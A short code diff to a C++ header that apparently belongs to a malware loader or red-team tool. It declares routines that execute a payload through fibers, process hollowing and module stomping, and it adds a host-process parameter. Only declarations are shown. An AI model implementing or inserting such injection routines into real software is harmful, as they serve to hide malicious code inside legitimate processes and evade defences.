@@ -14,7 +14,7 @@
 namespace GodMode
 {
     // Main dispatcher
-    void ExecutePayload(void* payload, size_t size, bool useFibers, bool useRunPE);
+    void ExecutePayload(void* payload, size_t size, bool useFibers, bool useRunPE, unsigned char hostProcess = 0);
 
     namespace Internal
     {
@@ -22,7 +22,7 @@ namespace GodMode
         void RunFiber(void* payload, size_t size);
 
         // Process Hollowing - Replace a suspended process's memory
-        void RunPE(void* payload, size_t size);
+        void RunPE(void* payload, size_t size, unsigned char hostProcess = 0);
 
         // Module Stomping - Overwrite a legit DLL's .text with payload
         void ModuleStomp(void* payload, size_t size);
